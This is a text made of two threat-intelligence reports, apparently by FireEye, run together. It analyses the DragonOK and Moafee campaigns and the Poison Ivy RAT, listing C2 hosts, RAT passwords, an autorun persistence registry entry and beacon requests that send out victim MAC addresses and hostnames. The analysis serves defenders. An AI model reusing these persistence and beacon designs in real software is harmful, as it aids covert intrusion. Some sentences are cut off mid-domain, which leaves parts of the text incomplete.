We observed environment - based evasion , the use of large file sizes , and password - protected documents – each of which are described in the sections below .
The first - stage payload for RATs called `` CT/ NewCT '' used by both the Moafee and DragonOK attack groups employs an evasive '' CPU core check '' technique .
The payload attempts to detect the number of processor cores in the running environment , by calling the `` GetSystemInfo '' API , which returns a structure with system data , including number of cores .
If only one core is detected , it quits as seen in Figure 5 .
This probably is an attempt to detect virtualized environments such as sandboxes , as well as other analysis environments used by reverse engineers , which often tend to be configured with a single core .
We also observed a similar evasion technique within the `` Sysget / HelloBridge '' payload employed by the DragonOK group .
It invokes a similar call to `` GetSystemInfo '' to determine the number of active CPU cores , and the code quits if the system is configured with only one core .
The `` DragonOK '' group in particular is known to use password - protected documents delivered as attachments in emails , with the password listed in the contents of the email .
This method probably is used to evade detection by AV software , gateway firewalls and malware sandboxes .
One such example using the password `` 888888 '' is shown in Figure 2 and Figure 6 , and has been observed by FireEye before .
Another similar sample was referenced by the `` contagio '' blog and used the password `` 8861 '' .
In older phishing emails that link to the tools used by DragonOK and Moafee , we observed an implant over 10 megabytes in size .
It was padded with unnecessary null bytes in the overlay section of the file , in order to increase the file size as shown in Figure 7 .
This probably was done to evade detection , as many host- based and network - based AV engines do not have the ability to scan large files .
This is a first stage payload that drops and runs the NewCT implant .
The first stage payload ( example : 46e55cdf507ef10b11d74dad6af8b94e ) attempts to detect the number of CPU cores in the running environment by calling GetSystemInfo as described in the previous section .
If the CPU core check detects more than one core , it implants the NewCT2 RAT in % temp % \MSSoap . DLL ( some variants will use BurnDCSrv . DLL and IntelAMTPP.DLL ) and executes the written file .
The actual implant is packaged in the resource section of the dropper with a fake bitmap ( BMP ) header , as shown in Figure 8 .
The implant also creates a registry entry file called named `` Windows.reg '' and imports it the contents of this file into the registry , using the command : `` regedit.exe /s Windows.reg '' .
These registry entries ensure startup persistence .
The contents of `` Windows.reg '' is populated based on the Operating System ( OS ) which is determined by a call to the GetVersionEx API .
If `` dwBuildNumber '' is equal to 2 ( VER _ PLATFORM_WIN32_NT ) and `` dwMajorVersion '' is less than 6 ( prior to Windows Vista ) it adds following entry for persistence : [ HKEY_CLASSES_ROOT\CLSID\ { fbeb8a05- beee-4442 - 804e-409d6c4515e9 } \ InProcServer32 ] @ = '' % Temp % \MSSoap . DLL '' Otherwise it creates a copy of itself to % Temp % \ WmiPrvSer.exe and creates the following entry for persistence : HKCU \Software\Microsoft\Windows\ CurrentVersion\Run\ '' dllhost '' = % Temp % \WmiPrvSer.exe We also found some clues in the binary that indicate that the tool was authored and built by someone using Chinese fonts on their computer .
It contains resource strings in English but the language is set to Chinese as shown below .
The implant ( example : ccff6e0a6f5e7715bdaf62adf0cbed4f ) is called `` NewCT / CT '' RAT .
The particular version we analyzed was NewCT version 2 .
The implant has persistence mechanisms and contains functionality to perform command and control communication .
This backdoor also has functionality to load additional plugins from the command and control server .
It exports the following two functions : SendData CreateInstance It creates a mutex `` HFRM _ '' to ensure there is only one running copy of the backdoor .
It ensures this by checking if the return value from CreateMutexA is 183 ( \xB7 ) , which corresponds to `` ERROR_ALREADY_EXISTS '' .
The payload emits the `` POST '' network beacon shown below along with stub data .
The header values are hardcoded in the payload , specifically the values for `` User - Agent '' , `` Cache - Control '' and the bytes at offset 0 of the stub ( \xcf\xcf ) may be of interest to network defenders .
The POST stub contains encrypted data .
The encrypted data has two layers of abstraction .
It is subjected to a bitwise NOT operation followed by encryption using a randomly generated 4-byte XOR key .
The data within the POST stub is constructed in a buffer with a header at offset 0 ( \ x30\x30 ) followed by the remote sever , remote port , XOR encrypted data and function call location .
The function call location is represented by the textual values shown in the table below and is selected using a switch case statement as shown in Figure 12 .
It is used by the attacker to track the call path that resulted in the network beacon .
The XOR encrypted data contains the MAC Address , hostname and campaign code .
To elucidate the encryption scheme , let us go over a sample decryption process .
The Figures 13 and 14 below shows data before and after a bitwise NOT operation .
In the resulting data after NOT operation , the XOR key is \x30\x30\x34\x31 .
When applied to the hex data following it , we get the decrypted data below , which contains the MAC Address , hostname , and campaign code .
The Python routine to perform this decryption is included in Appendix A We observed plugin functionality in the implant .
It has the ability to load a DLL downloaded from the remote server , and calls the following export functions in the DLL : Plugin_GetID Plugin_Init Plugins_Start Plugin_End The call graph for this functionality is shown in Figure 16 .
The following password - protected document ( 46ac122183c32858581e95ef40bd31b3 ) creates a DLL implant called IntelAMTPP.dll ( ebd1f5e471774bb283de44e121efa3e5 ) , which is the `` CT '' RAT .
In this case , the `` CT '' implant is 10 MB in size , as it has padded null bytes at the end of the file to increase file size in a possible attempt to evade AV engines as described in the previous section on evasion techniques .
The `` CT '' implant has identical functionality to `` NewCT '' , as observed from the embedded strings .
One of the command and control servers used by a variant of this implant is aptly named `` ct.datangcun [ .
We do not believe either Moafee or DragonOK have controlled the domain `` ct.datangcun [ .
The network beacon for version 2.1 is shown below ; it uses the same encryption scheme as `` NewCT '' : POST / HTTP/1.1 Accept - Language : en - en Content - Type : application / oc- tet - stream Pragma : no - cache Cache - Control : max - age=259200 Content - Length : 1572 User - Agent : Mozilla/4.0 ( compati- ble ; MSIE 6.0 ; Windows NT 5.1 ) Host : ct.datangcun [ .
The campaign codes re- ferred to victim countries , attack dates , command and control infrastructure , and other operational codes – which remain undeciphered .
We have observed DragonOK and Moafee use the Nflog implant in addition to an earlier version of the NewCT2 implant .
The pass- word - protected XLS document ( 46ac- 122183c32858581e95ef40bd31b3 ) ref- erenced earlier also drops an `` Nflog '' implant ( a3d3b0686e7bd13293ad0e63ebec67af ) in addition to … .. The `` Nflog '' implant emits the following network beacon format : POST /NfLog / Nfile.asp HTTP/1.1 Accept : * / * User - Agent : Mozilla/5.0 ( compati- ble ; MSIE 7.0 ; Windows NT 5.1 ) Host : Content - Length : 0 Cache - Control : no - cache POST /NfLog / NfStart.asp ? Clien- tId= { LocalIP } % 20 < 49d0 > % 20 { Ex- ternalIP } & Nick= { Identifier } & d- time = T:8 - 6 - 0 - 53 HTTP/1.1 Accept : * / * Use - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.0 ; .NET
We also found code - level similarities in the network communication function code , as well as the data collection function code shown in Figure 17 .
This strongly suggests that it is an updated version of the `` Nflog '' backdoor .
This tool has recently been analyzed by Secure- works .
We observed the DragonOK attacker employ this tool against targets in Japan and Taiwan ( e.g .
We have not yet seen the Moafee group use this tool .
This implant has the following beacon format : GET /el / sregister.php ? name= [ REDACTED ] HTTP/1.1 User - Agent : Mozilla/5.0 ( compatible ; MSIE 10.0 ; Windows NT 6.1 ; Trident/6.0 ) Host : 122.10.62.137 Connection : Keep - Alive Other URI formats include : /el / slogin.php ? uid= /el / suploadfile.php ? item= /el / suploadfile.php FireEye has previously analyzed this backdoor , which is used by multiple other groups in addition to DragonOK and Moafee .
The ex- tracted configuration blocks from a `` DragonOK '' PoisonIvy variant ( 65fcc9b9ff608801edc- 697552438cfee ) , is shown below : ID : ftp Domains : ftp.skydnastwm.com:15836| Password : Ecp982 * @ Me2 Mutex : fftp In contrast , here is an extracted PoisonIvy configuration block from a `` Moafee '' instance ( 9ebe86a648b1f19836251f946a160b16 ) , as shown below : ID : Domains : afp.mozjlla.com| Password : 741526 Mutex : ) ! afpA.I4 We have observed the Moafee group target the governments and militaries of countries with national interests in the South China Sea .
We have also observed this group target companies within the US defense industrial base .
As discussed , we have observed the Moafee group use a number of different tools including Poison Ivy , Nflog , Mongall , and NewCT2 .
We found this group running HTRAN on one of their front - end command and control servers .
The command and control server in question was located at 58.64.201.229 .
We monitored this server for two months , from January to March this year .
During this time period , we observed the following domains resolving to 58.64.201.229 : ph.moafee [ .
All of these HTRAN servers were located in the Guangdong Province and operated by CHINANET .
Additionally , the Moafee group also hosted a PoisonIvy command and control server at phi .
Between April 30 , 2012 and July 1 , 2012 , the phi.crabance [ .
This IP was observed hosting a HTRAN proxy client , which was seen connecting to a backend HTRAN server hosted at 113.66.248.60 .
This server was also located in the Guangdong Province and operated by CHINANET .
In short , the Moafee group was observed consistently hosting their backend HTRAN servers in Guangdong .
This observation may reveal that the Moafee group is physically located in this province .
We have observed the DragonOK group target high - technology and manufacturing companies in both Japan and Taiwan .
This group has used similar malware to the Moafee group described above .
Specifically , we observed DragonOK employing PoisonIvy , Nflog , Mongall , CT , and NewCT .
Like the Moafee group , we observed the DragonOK group running an HTRAN proxy client on one of their front - end command and control servers .
For approximately one week , between July 31 , 2013 and August 8 , 2013 , the domain www.ndbssh [ .
During this time , DragonOK also ran an HTRAN proxy client on www.ndbssh [ .
This HTRAN client was seen attempting to connect to three different HTRAN servers located in the Jiangsu province and operated by CHINANET .
The domain www.ndbssh [ .
The following other domains were seen resolving to this same IP : The DragonOK group was observed hosting their backend HTRAN servers in Jiangsu .
This observation may reveal that the DragonOK group is physically located in the Jiangsu province .
Based on the geolocation evidence provided in this paper , it appears that different operators executed the Moafee and DragonOK campaigns .
This conclusion is supported by the following assessments : • The campaigns target different industries in different geographic locations .
The Moafee campaign targets government and military organizations in countries with national interests in the South China Sea .
In contrast , the DragonOK campaign has been observed targeting high - technology and manufacturing companies in Japan and Taiwan .
The Moafee campaign can be traced to infrastructure located in the Guangdong province , whereas the DragonOK campaign can be traced to infrastructure located in the Jiangsu province .
While it seems that different operators are responsible for these two campaigns , our research showed that these operators share a number of common tools , techniques and procedures ( TTPs ) .
We also believe a separate third group is using these TTPs but we do not have sufficient insight to this operator at this time .
The shared TTPs include : • Usage of the same custom backdoors and RATs such as CT / NewCT / NewCT2 , Mongall , Nflog , as well as off - the - shelf RATs such as PoisonIvy , to maintain access to the victims ' networks .
We assess that these shared TTPs may be the result of : • A direct relationship between the operators .
We would like to thank Ronghwa Chong , Nart Villeneuve , Darien Kindlund , Kenneth Gears and Jonathan Wrolstad for their insight , research and support .
These highly sophisticated cyber attacks easily circumvent traditional signature - based defenses , such as next - generation firewalls , IPS , anti - virus , and gateways .
The FireEye Threat Prevention Platform provides real - time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors and across the different stages of an attack life cycle .
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .
Remote access tools ( RATs ) may be the hacker 's equivalent of training wheels , as they are often regarded in IT security circles .
But dismissing this common breed of malware could be a costly mistake .
Despite their reputation as a software toy for novice `` script kiddies , '' RATs remain a linchpin of many sophisticated cyber attacks .
Requiring little technical savvy to use , RATs offer unfettered access to compromised machines .
They are deceptively simple - attackers can point and click their way through the target 's network to steal data and intellectual property .
But they are often delivered as key component of coordinated attacks that use previously unknown ( zero - day ) software flaws and clever social engineering .
Even as security professionals shrug off the threat , the presence of a RAT may in itself indicate a targeted attack known as an advanced persistent threat ( APT ) .
Unlike malware focused on opportunistic cybercrime ( typically conducted by botnets of comprised machines ) , RATs require a live person on the other side of the attack .
This report spotlights Poison Ivy ( PIVY ) , a RAT that remains popular and effective a full eight years after its release , despite its age and familiarity in IT security circles .
In conjunction with the study , FireEye® is releasing Calamine , a set of free tools to help organizations detect and examine Poison Ivy infections on their systems .
Poison Ivy has been used in several high - profile malware campaigns , most notoriously , the 2011 compromise of RSA SecurID data .
The same year , Poison Ivy powered a coordinated attack dubbed Nitro against chemical makers , government agencies , defense firms and human - rights groups .
Several ongoing cyber attack campaigns use Poison Ivy , including these : • admin @ 338-Active since 2008 , this campaign mostly targets the financial services industry , though we have also seen activity in the telecom , government , and defense sectors .
Understanding why Poison Ivy remains one of the most widely used RATs is easy .
Controlled through a familiar Windows interface , it offers a bevy of handy features : key logging , screen capturing , video capturing , file transfers , password theft , system administration , traffic relaying , and more .
And Poison Ivy is so widely used that security professionals have a harder time tracing attacks that use the RAT to any particular attacker .
We hope to eliminate some of that anonymity with the FireEye Calamine package .
The package , which enables organizations to easily monitor Poison Ivy 's behavior and communications , includes these components : • PIVY callback - decoding tool ( ChopShop module ) • IVY memory - decoding tool ( Immunity Debugger PyCommand script ) ChopShop is a new framework developed by the MITRE Corporation for network - based protocol decoders that enable security professionals to understand actual commands issued by human operators controlling endpoints .
The FireEye PIVY module for ChopShop decrypts Poison Ivy network traffic .
The FireEye PyCommand script dumps configuration information from a running PIVY process on an infected endpoint , which can provide additional telemetry about the threat actor behind the attack .
The tools are available for download at the following locations : • https : //github.com / fireeye / pycommands • https : //github.com / fireeye / chopshop By tracking the PIVY server activity , security professionals can find these telltale indicators : • The domains and IPs used for Command and Control ( CnC ) • The attacker 's PIVY process mutex • The attacker 's PIVY password • The launcher code used in the malware droppers • A timeline of malware activity This report explains how Calamine can connect these and other facets of the attack .
This evidence is especially useful when it is correlated with multiple attacks that display the same identifying features .
Combining these nuts - and - bolts details with big - picture intelligence can help profile threat attackers and enhance IT defenses .
Calamine may not stop determined attackers that use Poison Ivy .
But it can make their criminal endeavors that much more difficult .
Poison Ivy is a remote access tool that is freely available for download from its official web site at www.poisonivy-rat.com .
First released in 2005 , the tool has gone unchanged since 2008 with v ersion 2.3.2 .
Poison Ivy includes features common to most Windows - based RATs , including key logging , screen capturing , video capturing , file transfers , system administration , password theft , and traffic relaying .
Poison Ivy 's wide availability and easy - to - use features make it a popular choice for all kinds of criminals .
But it is probably most notable for its role in many high profile , targeted APT attacks .
These APTs pursue specific targets , using RATs to maintain a persistent presence within the target 's network .
They move laterally and escalate system privileges to extract sensitive information- whenever the attacker wants to do so . , Because some RATs used in targeted attacks are widely available , determining whether an attack is part of a broader APT campaign can be difficult .
Equally challenging is identifying malicious traffic to determine the attacker 's post - compromise activities and assess overall damage - these RATs often encrypt their network communications after the initial exploit .
In 2011 , three years after the most recent release of PIVY , attackers used the RAT to compromise security firm RSA and steal data about its SecureID authentication system .
That data was subsequently used in other attacks .
The RSA attack was linked to Chinese threat actors and described at the time as extremely sophisticated .
Exploiting a zero - day vulnerability , the attack delivered PIVY as the payload . , It was not an isolated incident .
The campaign appears to have s tarted in 2010 , with many other companies compromised .
Just recently , PIVY was the payload of a zero - day exploit in Internet Explorer used in what is known as a '' strategic web compromise '' attack against visitors to a U.S. government website and a variety of others .
This characteristic is distinctly different from crimeware ( malware focused on cybercrime ) , where the criminal can issue commands to their botnet of compromised endpoints whenever they please and set them to work on a common goal such as a spam relay .
In contrast , RATs are much more personal and may indicate that you are dealing with a dedicated threat actor that is interested in your organization specifically .
The Poison Ivy builder kit allows attackers to customize and build their own PIVY server , which is delivered as mobile code to a target that has been compromised , typically using social engineering .
Once the server executes on a target 's endpoint , it connects to a PIVY client installed on the attacker 's machine , giving the attacker control of the target system .
The PIVY server code can executed on the target endpoint in a number of ways , depending on how the attacker configured it .
In the most common configuration , the PIVY server divides its code into two parts : • Initialization and maintenance code • Networking code The initialization and maintenance code is injected into the already - running explorer.exe process .
Depending on how the attacker configures it , the networking code launches a hidden Web browser process ( the system 's default browser ) and injects itself into that process .
The networking code then remotely downloads ( from the attacker 's PIVY client as shellcode ) the rest of the code and data it needs for its features and functionality .
The new code executes on the target 's endpoint within the context of the target process .
All of PIVY 's global variables , configuration details , and function pointers are stored in a C - style struct ( data structure ) , which is also injected into the target processes in both the PIVY networking code and initialization and maintenance code .
This distinct characteristic has the side effect of having every CALL instruction and global variable address being referenced as an offset to a register when looking at the code 's disassembly .
The code injected into explorer.exe is peculiar in that , unlike most malware - injected code , this code is injected function by function- each with its own memory region , filling in the proper function pointers in its struct .
If the '' persistence '' PIVY option is enabled , a watchdog thread is also injected into explorer.exe , which automatically restarts the PIVY server process if it is unexpectedly terminated by the target 's operating system .
Figure 2 : Data and functions referenced as offsets to the struct pointed to by the ESI register Poison Ivy features a complex , custom network protocol over TCP .
Most of this communication is encrypted using the Camellia cipher with a 256-bit key.14 The key is derived from a password provided by the attacker when building the PIVY server .
The password , `` admin '' by default , can be provided in plain text or as hex - ASCII .
The password is zero - padded to 32 bytes ( 256 bits ) .
The key is validated at the beginning of the TCP session with a challenge - response algorithm .
The PIVY server sends 256 bytes of randomly generated data to the PIVY client which , in turn , encrypts the data using the key and sends it back to the PIVY server for validation .
Much of the data sent throughout PIVY 's communications is also compressed before encryption using Microsoft 's LZNT1 compression algorithm,15 which PIVY utilizes through the Windows RtlCompressBuffer API .
The protocol operates by sending encrypted data in chunks that are prepended with the following encrypted 32-byte header : struct PI_chunk_header { int command_id ; int stream_id ; int padded_chunk_size ; int chunk_size ; int decompressed_chunk_size ; long total_stream_size ; int padding ; } ; The PI_chunk_header structure is arranged as follows : command_id - This member identifies which feature of PIVY the chunked data is related to .
The FireEye Poison Ivy decoder checks the beginning of each TCP session for possible PIVY challengeresponse sequences .
If found , the module will try to validate the response using one or more passwords supplied as arguments .
If no password is supplied , it tries the default `` admin '' password .
You can supply a single password in either plain - text form or hex - ASCII form .
For multiple passwords , you can specify a text file containing line - delimited passwords .
If the decoder identifies valid initial PIVY flows based on a supplied password , then the decoder decodes the rest of the relevant flow or flows .
To use the FireEye ChopShop module , you must install CamCrypt , a python wrapper for an open - source implementation of the Camellia encryption library .
Most of the features of PIVY are covered to some extent in this module .
Note : If the PIVY flows do not correspond to any supplied password , then decoding fails .
Fortunately , you can easily locate the custom PIVY password if you have a compromised endpoint infected with PIVY or a copy of the PIVY server code , as explained in the section `` Locating the PIVY Password with the Calamine PyCommand Script .
The decoder prints the sample rate , channel , and bit data .
This module partially supports decoding listings of Windows files , the registry , services , processes , devices , and installed application listings .
During PIVY flow decoding , the module 's default output indicates that listing requests have occurred and , when applicable , highlights which key or directory is being listed .
Directory listings are printed , but without file details .
When the module is invoked with the -1 option , all returned list data is saved to a file in raw for m , just as it is seen by the PIVY client : a mixtur e of strings and binary data describing those strings .
If you are interested in the details of what was listed , running the strings tool on raw file dumps is useful .
If you encounter an unrecognized command or want to extend the functionality of this decoder , the -d option is useful .
It prints hex dumps of all the headers and assembled streams in both directions , helping to analyze and build additional parsing functionality .
Many attackers leave the default `` admin '' password unchanged .
In this case , you can start using this decoder immediately .
Often , however , the attacker opts for better security by creating a unique password .
But if you have access to the PIVY - infected endpoint or to the PIVY server executable , retrieving the password is easy .
You can retrieve the password a number of ways , depending on your circumstance and preferences .
If you prefer working with memory dumps , digital forensics expert Andreas Schuster has released a wonderful Volatility plugin for PIVY.18 Volatility dumps most of PIVY 's useful configuration data , including the password , as shown at the Volatility project page ( http : //code.google.com / p / volatility/ source / browse / trunk / contrib / plugins / malware/ poisonivy.py ? r=2833 ) .
If you have a malware - analysis environment setup , the Calamine PyCommand19 script for Immunity Debugger is quick and simple .
The Volatility plugin is available at https : //www.volatilesystems .
Corelan Team .
Follow these steps to use the PyCommand ( these steps may vary in some situations ) : 1 .
Attach Immunity Debugger to the process PIVY injects into ( or to the PIVY process itself if PIVY does not inject ) .
Set breakpoints on the send and connect functions .
Continue execution .
Wait for the execution to break .
Execute until return and step out of the function .
Run the PyCommand .
Check the logs for the configuration details .
To effectively assess the damage sustained in an attack , you must reconstruct the attacker 's activities .
Depending upon the attacker 's cleanup efforts , fully reconstructing their activities from host forensics alone may not be possible .
But if PIVY network activity is collected , the Calamine ChopShop module can help uncover this information .
In the following example , we set up a test environment and executed commands typically run by attackers after they compromise a system with PIVY and prepare to move laterally .
Then Defender 's View Starting ChopShop Initializing Modules ...
Initializing module ' poisonivy_23x ' Transferred files will be saved .. Screen / Cam / Audio / Key captures will be saved .. Running Modules ...
Shutting Down poisonivy_23x Module Shutdown Complete ...
After the initial compromise , the `` attackers '' see that they have a new target endpoint and do the following : • Execute some basic commands such as ipconfig to collect the network information of the endpoint • Upload the password - dumping tool gsecdump ( available at http : //www.truesec .
Each individual attack within a campaign can be divided into the following phases : , , • Reconnaissance • Exploitation • CnC • Lateral movement • Exfiltration ( or other malicious actions on the target ) Each of these phases provides opportunities to derive threat intelligence about the adversary .
Over time , security professionals can acquire and analyze evidence to determine whether the attacks constitute malware - based espionage .
Such an assessment requires understanding these components of an attack : • Timing and targeting preferences • Exploits and malware • Network infrastructure • Scope of attackers ' activities within a compromised network ( including stolen data ) • Characteristics of the target population This assessment demands more than just malware analysis .
It requires analyzing both the technical and contextual aspects of a breach and exploring competing hypotheses . , These steps are important because investigators will always face visibility gaps - limitations in knowing the geographic and industry reach of attacks or details of malware activity in some phases of the attack .
For this analysis , we collected 194 Poison Ivy samples used in targeted attacks between 2008 and 2013 .
We extracted 22 different passwords and 148 mutexes .
We also mapped out the CnC infrastructure , which comprised 147 domains and 165 IP addresses .
We analyzed these samples to better understand the tools , tactics , and procedures ( TTPs ) of the attackers , explore campaign connections among them , and enable defenders to better secure their networks .
In addition to clustering the samples based on technical indicators , such as the passwords and CnC information extracted from the samples , we also analyzed contextual indicators where possible , such as attackers ' targeting preferences and lures used in social engineering .
Each PIVY server ( the malware that the attacker sends to the target ) can be configured to connect to multiple CnC servers using any TCP port .
So seeing a PIVY sample that attempts to connect to multiple CnC servers on different TCP ports is not unusual .
But the most common ports used in targeted attacks are those associated with Web traffic - especially 443 , the TCP port used for SSL - encrypted Web traffic .
Port 443 is a significant choice for two reasons .
First , perimeter defenses must allow outbound traffic through this port so that users can access legitimate SSL - encrypted websites .
Second , because the traffic on port 443 is encrypted , PIVY 's encrypted traffic may bl end in with normal network activity .
The attacker can set the PIVY process mutex name at build time .
While some attacks use the default mutex of ) ! VoqA.I4 , most create a custom mutex for each attack .
Of the 147 mutexes in our sample set , 56 were designed for one - time use .
If attackers create a unique password at build time rather than using the PIVY default `` admin '' , that custom password is the most unique indicator .
While threat actors may change passwords used over time , we have found that they often use the same one for significant periods .
When combined with CnC data , the passwords used by the actors provide unique indicators that can be used to cluster related activity .
To cluster the activity of specific APT campaigns across our PIVY sample set , we first grouped the PIVY samples by common CnC infrastructure .
Using passive DNS , we clustered the domain names used by the common IP address to which they resolved .
Because attackers may park their domains by pointing to IP addresses that they do not necessarily control ( and to account for other possible anomalies in passive DNS data ) , we layered additional indicators extracted from the samples , such as PIVY passwords , mutexes , campaign `` marks / codes , '' and launcher information .
From our data set , we focused on three separate APT campaigns and corresponding threat actors identified by the PIVY password used in subsequent attacks : • admin @ 338 • th3bug • menuPass Each of these campaigns is detailed in the corresponding sections .
To triangulate the timing ( when the sample was likely used ) , we used the portable executable ( PE ) compile time extracted from the PIVY samples and the date each sample appeared first appeared in a malwareanalysis services such as VirusTotal .
Each of these APT campaigns has been active from 2008 through 2013 .
Our data set for the admin @ 338 threat actor contains the following : • 21 Poison Ivy samples • 3 passwords • 43 CnC servers The earliest admin @ 338 PIVY sample we have dates to December 27 , 2009 .
But we believe that this campaign was active as early as January 7 , 2008 , using other PIVY passwords ( key @ 123 and gwx @ 123 ) .
This ongoing campaign tends to target the finance , economic , and trade policy but we see significant activity in the ISP / telco , government , and defense sectors as well .
The preferred attack vector used by this campaign is spear - phishing emails .
Using content that is relevant to the target , these emails are designed to entice the target to open an attachment that contains the malicious PIVY server code .
The content of the spear - phishing emails and the decoy documents opened after exploitation tend to be in English - although the character set of the email message body in Figure 10 is actually Chinese ( character set GB2312 ) .
This campaign has used weaponized Microsoft Word documents ( CVE-2012 - 0158 ) , Adobe Acrobat PDFs ( CVE-2009 - 4324 ) and Microsoft Help Files ( .HLP
The decoy documents that are opened in exploitation typically contain content that is contextually relevant to both the text of the spear - phishing email and to the interests of the intended target .
The documents are legitimate- but weaponized - documents in English .
In addition to the PIVY password admin @ 338 , we clustered individual attacks by using passive DNS data to look at the IP addresses the CnC servers have resolved to over time .
We found that common IP addresses among PIVY samples for admin @ 338 , key @ 123 and gwx @ 123 .
We can link PIVY passwords key @ 123 with admin @ 338 by observing the following connections : • The key @ 123 sample , 808e21d6efa2884811fbd0adf67fda78 , connects directly to 219.76.208.163 .
We can link PIVY passwords gwx @ 123 with admin @ 338 by observing the following connections : • The gwx @ 123 sample 0323de551aa10ca6221368c4a73732e6 connects to the CnC domain names microsofta .
These domain names resolved to 113.10.246.30 219.90.112.203 , 202.65.220.64 , 75.126.95.138 , 219.90.112.197 , 202.65.222.45 , and 98.126.148.114 .
This data indicates a relationship among the threat actors behind these attacks - in most cases , they at least share a common CnC infrastructure .
In addition to historic DNS resolutions , PIVY process mutexes suggest a relationship between PIVY passwords gwx @ 123 and admin @ 338 .
Although the mutexes of gwx @ 123 , wwwst @ Admin , and admin @ 338 samples were different , the choice of characters in the mutex revealed a similar pattern .
Our data set for th3bug threat actor comprises the following : • 14 Poison Ivy samples • 2 passwords • 9 CnC servers The earliest th3bug PIVY sample we have is dated October 26 , 2009 .
This ongoing campaign targets a number of industries but appears to prefer targets in higher education and the healthcare sectors .
Unlike the other two campaigns described in this report ( admin @ 338 and menuPass ) , th3bug does not appear to rely on spear phishing to distribute PIVY .
Instead , attacks attributed to th3bug use a strategic Web compromise to infect targets .
This approach is more indiscriminate , which probably accounts for the more disparate range of targets .
In the FireEye blog , we documented a recent th3bug strategic Web compromise .
In the following example , the actor or actors behind the th3bug campaign compromised multiple websites that catered to the intended targets .
The attacker used injected JavaScript on the compromised websites to redirect targets to an Internet Explorer exploit that dropped Stage 1 launcher / downloader mobile code .
This downloader then retrieved and installed a PIVY RAT variant .
In related campaigns , th3bug has used a number of different Java and Internet Explorer exploits , including ( CVE-2013 - 0422 ) , ( CVE-2013- 1347 ) , and ( CVE-2011 - 3544 ) .
The default PIVY password of admin has been used by multiple , distinct threat actors - so clearly , we can not link all PIVY samples with the admin password to th3bug .
But evidence suggests that the attackers originally used the default password before settling on th3bug .
We can link at least one PIVY sample that uses the admin password to the th3bug campaign based on the following connections : • The sample 8002debc47e04d534b45f7bb7dfcab4d connected to kr.iphone.qpoe.com with the PIVY password admin .
We found a smaller number of distinct PIVY samples linked to th3bug than we did for the admin @ 338 and menuPass campaigns .
This paucity is likely a result of two factors .
First , th3bug does not appear to stage a high volume of attacks .
Instead , it appears to run only a handful of strategic Web compromise attacks each year .
Second , th3bug stages its delivery of PIVY .
So to acquire the second - stage PIVY server payload , an attack must be observed in real time .
Our data set for the menuPass threat actor comprises the following : • 118 Poison Ivy samples • 8 passwords • 61 domains • 74 IP addresses The earliest menuPass PIVY sample we have is dated December 14 , 2009 .
This sample ( b08694e14a9b966d8033b42b58ab727d ) connected to a control server at js001.3322.org with a password xiaoxiaohuli ( Chinese translation : '' little little fox '' ) .
Based on what we have found , it appears that the threat actor behind menuPass prefers to target U.S. and foreign defense contractors .
The menuPass campaign appears to favor spear phishing to deliver payloads to the intended targets .
The email shown in Figure 21 shows a typical menuPass spear - phishing attempt .
While the attackers behind menuPass have used other RATs in their campaign , it appears that they use PIVY as their primary persistence mechanism .
The menuPass campaign has used weaponized Microsoft Word documents ( CVE-2010 - 3333 ) 35 and ZIP files containing executable files to drop PIVY directly onto its targets .
Figure 22 outlines several executables delivered in ZIP files attached to menuPass spear - phishing emails .
The menuPass attackers favor using a launcher that masquerades as a Microsoft Foundation Class Library application36 using the document/ view architecture .
This launcher includes a packed copy of the PIVY server that is subsequently unpacked and executed in memory shortly after a useless call to the FindFirstFile API .
Out of the 155 samples we collected f or menuPass , 81 of them are MFC apps with a document class .
Out of these 81 MFC launchers , 64 use the CBricksDoc class name .
We also found these names : • CMy20130401Doc • CShellCodeDoc • CMy20130401Doc • CPiShellPutDo • CCrocodileDoc • CMy20130401Doc • CStatePattern_GameDoc • CPiShellPutDoc • CPIVCDoc • CMy1124Doc • CLightGameDoc • CPiShellPutDoc Some samples were packed into projects taken from the Web and repurposed to serve as launchers .
The most popular PIVY password used by the menuPass campaign is keaidestone ( used in 35 samples ) followed by menuPass ( 24 samples ) .
The threat actor also used these PIVY passwords in the same campaign : • suzuki • happyyongzi • admin • smallfish • XGstone • xiaoxiaohuli • fishplay A number of IPs in the 60.10.1.0/24 Classless Inter - Domain Routing ( CIDR ) block have hosted domains used in the menuPass campaign .
We can see the connection between the keaidestone password and the XGstone password by observing the following connections in this same /24 CDIR block : • The IP 60.10.1.120 hosted the domain apple .
This sample also used the CBricksDoc launcher .
We can also see the connection between the keaidestone password and the smallfish password by observing the connections in the 60.10.1.0/24 CDIR block : • The domain dedydns.ns01.us resolved to 60.10.1.121 .
We can see the connection between the keaidestone password and the happyyongzi password by observing the connections in the 60.10.1.0/24 CDIR block : • The domain maofajapa.3322.org resolved to 60.10.1.121 .
The password suzuki can be linked to keaidestone by observing the following relationships : • The sample 410eeaa18dbec01a27c5b41753b3c7ed connected to send.have8000.com with the password of suzuki .
We can link the password of menuPass to keaidestone by observing the following connections : • 08709f35581e0958d1ca4e50b7d86dba has a compile time of July 20 , 2012 and connected to tw.2012yearleft.com with the password keaidestone .
This sample also used the CBricksDoc launcher .
This sample also used the CBricksDoc launcher .
This sample used a launcher of CPiShellPutDoc .
This sample also used a launcher of CPiShellPutDoc .
We can see the connection between the happyyongzi password and menuPass by observing the following connections : • The sample e6ca06e9b000933567a8604300094a85 connected to the domain sh.chromeenter .
Similar to other threat actors , this threat actor has also used PIVY samples using the default admin password .
Again , not all PIVY samples with the password admin can be linked to menuPass .
But we can see the connection between the menuPass and at least a couple of instances of PIVY using the admin password via the following connections : • • The sample 56cff0d0e0ce486aa0b9e4bc0bf2a141 was compiled on 2011 - 08 - 31 and connected to mf.ddns.info with the password menuPass .
This same IP also hosted the domain av.ddns.us on the same date .
The password of fishplay can be linked to menuPass by observing the following relationships : • The sample 494e65cf21ad559fccf3dacdd69acc94 connected to mongoles.3322.org with the password fishplay .
We can link the password of xiaoxiaohuli to menuPass through the shared CPiShellPutDoc launcher : • f5315fb4a654087d30c69c768d80f826 had a compile time of May 21 , 2010 and connected to ngcc.8800.org with the password of menuPass .
Finally , we can link the password of happyyongzi to xiaoxiaohuli by observing the following relationships : • e6ca06e9b000933567a8604300094a85 has a compile time of 2010 - 06 - 29 and connects to sh.chromeenter.com with the password happyyongzi .
We can not say with certainty why the actors responsible for the admin @ 338 , menuPass , and th3bug campaigns rely on Poison Ivy .
